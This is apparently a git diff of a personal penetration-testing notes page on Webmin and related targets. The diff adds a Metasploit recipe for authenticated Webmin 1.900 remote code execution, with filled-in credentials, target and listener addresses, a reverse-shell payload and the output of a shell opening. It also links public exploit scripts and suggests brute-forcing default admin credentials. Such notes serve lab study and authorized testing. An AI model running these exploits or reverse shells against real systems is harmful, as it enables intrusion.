@@ -294,7 +294,7 @@ SELECT * FROM ost_form_entry;
 * Brute the admin default \[admin:admin]
 * https://github.com/0xskunk/IPFire-2.15-Shellshock-Exploit/blob/master/SIPS.py
 
-### Webmin
+### Webmin 1.8.90
 
 * MiniServ 1.890 (Webmin httpd)
 * https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890\_exploit.py
@@ -304,11 +304,46 @@ SELECT * FROM ost_form_entry;
 * Read the config files
 * Will run as root
 
+### Webmin 1.900&#x20;
+
+* MiniServ 1.900 (Webmin httpd)
+* Requires credentials in order to exploit
+* can use a metasploit module once credentials are obtained&#x20;
+
+```
+exploit/linux/http/webmin_packageup_rce
+PASSWORD   Password6543     yes       Webmin Password
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     172.16.1.17      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using
+                                         -metasploit.html
+   RPORT      10000            yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path for Webmin application
+   USERNAME   admin            yes       Webmin Username
+
+cmd/unix/reverse_perl
+LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
+   LPORT  8888             yes       The listen port
+
+run
+
+[*] Started reverse TCP handler on 10.10.14.2:8888 
+[+] Session cookie: bda1415ad657230f23aac213aa96a878
+[*] Attempting to execute the payload...
+[*] Command shell session 1 opened (10.10.14.2:8888 -> 10.10.110.3:10784) at 2024-04-13 21:21:53 -0400
+```
+
 ### init.d linux pe
 
-* ![Screenshot 2021-08-18 082244](https://user-images.githubusercontent.com/75596877/129897354-b6d4149f-4a29-4f65-9af7-8410d1a0d4a5.png)
-* ![Screenshot 2021-08-18 082313](https://user-images.githubusercontent.com/75596877/129897409-37fe5930-49c2-4e74-9859-4b0d3467a73f.png)
-* ![Screenshot 2021-08-18 082335](https://user-images.githubusercontent.com/75596877/129897438-9d485c16-473d-46cc-a6c5-17edbfd47063.png)
+*
+
+    <figure><img src="https://user-images.githubusercontent.com/75596877/129897354-b6d4149f-4a29-4f65-9af7-8410d1a0d4a5.png" alt=""><figcaption></figcaption></figure>
+*
+
+    <figure><img src="https://user-images.githubusercontent.com/75596877/129897409-37fe5930-49c2-4e74-9859-4b0d3467a73f.png" alt=""><figcaption></figcaption></figure>
+*
+
+    <figure><img src="https://user-images.githubusercontent.com/75596877/129897438-9d485c16-473d-46cc-a6c5-17edbfd47063.png" alt=""><figcaption></figcaption></figure>
 
 ### webserv
 
